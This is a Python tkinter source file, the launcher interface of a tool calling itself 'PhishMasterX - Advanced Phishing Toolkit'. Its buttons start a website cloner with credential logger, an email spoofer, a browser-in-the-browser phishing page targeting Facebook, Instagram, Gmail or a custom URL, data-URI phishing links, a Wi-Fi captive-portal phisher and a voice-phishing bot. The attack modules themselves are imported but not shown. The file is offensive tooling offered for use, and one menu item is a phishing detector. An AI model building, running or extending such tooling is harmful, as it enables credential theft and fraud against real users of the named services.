import tkinter as tk
from tkinter import messagebox
import subprocess
import threading

def run_cloner():
    import core.cloner as cloner
    cloner.start_cloner('facebook')  # Default, ya popup se option le lo

def run_qr():
    import core.qr_module as qr
    qr.generate_qr()

def run_email():
    import email_mod.smtp_spoofer as smtp
    smtp.send_email()

def run_ai_detector():
    import core.ai_detector as ai
    ai.analyze_html()

def run_bitb():
    from core.bitb_phisher import start_bitb_dynamic

    def launch():
        option = popup.get()
        if option == "Facebook":
            url = "https://www.facebook.com"
        elif option == "Instagram":
            url = "https://www.instagram.com"
        elif option == "Gmail":
            url = "https://mail.google.com"
        elif option == "Custom URL":
            url = url_entry.get()
        else:
            messagebox.showerror("Error", "Please select a valid option.")
            return

        threading.Thread(target=start_bitb_dynamic, args=(url,)).start()

    popup = tk.StringVar()
    popup.set("Facebook")

    win = tk.Toplevel(root)
    win.title("BitB Phisher")

    tk.Label(win, text="Select Target:").pack(pady=5)
    for opt in ["Facebook", "Instagram", "Gmail", "Custom URL"]:
        tk.Radiobutton(win, text=opt, variable=popup, value=opt).pack(anchor="w")

    tk.Label(win, text="Custom URL (only if selected):").pack(pady=5)
    url_entry = tk.Entry(win, width=40)
    url_entry.pack(pady=5)

    tk.Button(win, text="Launch BitB", command=launch).pack(pady=10)

def run_data_uri():
    import core.data_uri_builder as builder
    builder.create_data_uri()

def run_wifi_phisher():
    import core.wifi_phisher as wifi
    wifi.start_captive()

def run_vishing():
    import voicebot.voive_bot as vish
    vish.run_vishing()

root = tk.Tk()
root.title("PhishMasterX GUI")
root.geometry("400x500")

tk.Label(root, text="📡 PhishMasterX - Advanced Phishing Toolkit", font=("Helvetica", 14, "bold")).pack(pady=10)

tk.Button(root, text="1. Website Cloner + Logger", width=40, command=lambda: threading.Thread(target=run_cloner).start()).pack(pady=5)
tk.Button(root, text="2. QR Code Generator", width=40, command=lambda: threading.Thread(target=run_qr).start()).pack(pady=5)
tk.Button(root, text="3. Email Phishing Sender", width=40, command=lambda: threading.Thread(target=run_email).start()).pack(pady=5)
tk.Button(root, text="4. Analyze HTML for Phishing", width=40, command=lambda: threading.Thread(target=run_ai_detector).start()).pack(pady=5)
tk.Button(root, text="5. Launch BitB Phishing Page", width=40, command=run_bitb).pack(pady=5)
tk.Button(root, text="6. Create Data URI Phishing Link", width=40, command=lambda: threading.Thread(target=run_data_uri).start()).pack(pady=5)
tk.Button(root, text="7. Start Wi-Fi Captive Portal", width=40, command=lambda: threading.Thread(target=run_wifi_phisher).start()).pack(pady=5)
tk.Button(root, text="8. Voice Phishing Bot (Vishing)", width=40, command=lambda: threading.Thread(target=run_vishing).start()).pack(pady=5)
tk.Button(root, text="Exit", width=40, command=root.quit).pack(pady=10)

root.mainloop()

